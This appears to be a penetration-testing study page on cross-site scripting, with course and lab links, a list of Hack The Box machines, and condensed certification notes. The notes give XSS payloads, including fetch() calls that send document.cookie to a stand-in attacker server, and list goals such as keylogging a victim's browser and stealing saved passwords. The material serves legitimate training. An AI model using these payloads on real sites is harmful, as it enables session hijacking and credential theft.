![image](https://github.com/user-attachments/assets/ad53639a-a98a-4422-b451-b37c88408a42)

# Cross-Site Scripting

## Training Resources
---
### Courses
*Free*
- [PortSwigger Academy - Cross-Stie Scripting](https://portswigger.net/web-security/cross-site-scripting)

*Paid*
- [HTB - Advanced XSS and CSRF](https://academy.hackthebox.com/course/preview/advanced-xss-and-csrf-exploitation)
- [THM - Intro to Cross-Site-Scripting](https://tryhackme.com/r/room/xss)
- [THM - XSS](https://tryhackme.com/r/room/axss)

#

### Hack The Box Machines
*These machines are tagged as containing Cross-Site Scripting by HTB, the difficulty refers to the box as a whole and not necessarily the Cross-Site Scripting element.*

| Machine Name | Difficulty | Completed |
| -- | -- | -- |
| CloudFall | Easy | |
| Headless | Easy  | |
| Sea | Easy | |
| Sightless | Easy | |
| Book  | Medium | |
| Extension  | Medium | |
| RedCross | Medium  | |
| Schooled | Medium | |
| FormulaX | Hard | |
| Holiday | Hard | |
| Mailroom | Hard | |
| OverGraph | Hard | |
| EasyAccess | Hard | |
| Cereal | Hard | |
| Visor | Hard | |
| RopeTwo | Insane | |
| Bookworm | Insane | |
| Anubis | Insane | |
| Bankrobber | Insane | |
| Fingerprint | Insane | |
| Stacked | Insane  | |
| Corporate | Insane | |
| CrossFit | Insane | |
| Derailed | Insane | |


### Other Resources
---
**PT Guides**
- [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#xss-cross-site-scripting)
- [Sushant OSCP Guide - XSS](https://sushant747.gitbooks.io/total-oscp-guide/content/cross-site-scripting.html)
- [My Guide - XSS](https://tom23rose.gitbook.io/testingmethodology/web-testing/exploitation/injection-attacks/cross-site-scripting-xss)
- [The Hacker Recipes - XSS](https://www.thehacker.recipes/web/inputs/xss#xss-cross-site-scripting)
#
**Bug Bounty Write Ups**
- [Bug Bounty Write Ups](https://github.com/alexbieber/Bug_Bounty_writeups#cross-site-scripting-xss)
#
**Methodologies**
- [OWASP - testing for Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [OWASP - testing for Stored XSS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
#
**Wordlists**
- [SecLists - XSS Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)
- [Port Swigger Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
#
**SQL Prevention**
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
#

## Condensed Notes
This is a condensed version of the notes I used during OSWA and are by no means complete. Make your own notes and methodology, building off these basic steps. 

- Identify potential injection points where the input is reflected back to the browser. Or in the case of blind-xss, where there's an indication it'll be reflected to someone elses browser.
- Use automated tools such as XSStrike to identify XSS on the application
```bash
python3 xsstrike.py --crawl -l 2 -u "http://IP:PORT/?paameter=value&parameter2=value2"
```
- Burp Suite will attempt to identify XSS during an active scan
- For manual testing, start by inputting random, unique, easily identifiable strings "p9jal3ex" into requests and seeing if they're reflected anywhere in the application.
- Once identified, try basic XSS and attempt to guage the context of the reflection, think about what is needed to break out of this context and exploit JavaScript. The [PortSwigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) can be useful here.
- A simple POC can be an alert box, try to improve this to connect back to an attacker controlled server.
```bash
alert(1)

fetch("http://attacker-server:8888)
```
- Are the session cookies protected with HTTPOnly, if not can we exfiltrate them using payloads like:
```bash
fetch("http://attacker-server:8888/exfil?data=" + document.cookie)
```
- Can we bypass restriction in our payload by hosting a malicious file on our web server and getting it with the XSS payload, causing the malicious js file to execute with more complex JavaScript.
- Try to perform the following:
  - Capture session cookies of a privileged user
  - Capture local storage data
  - Perform CSRF with XSS by hosting JavaScript in malicious file on attacker server
  - Inser a key logger into the vuctims browser
  - Steal passwords saved into the browser
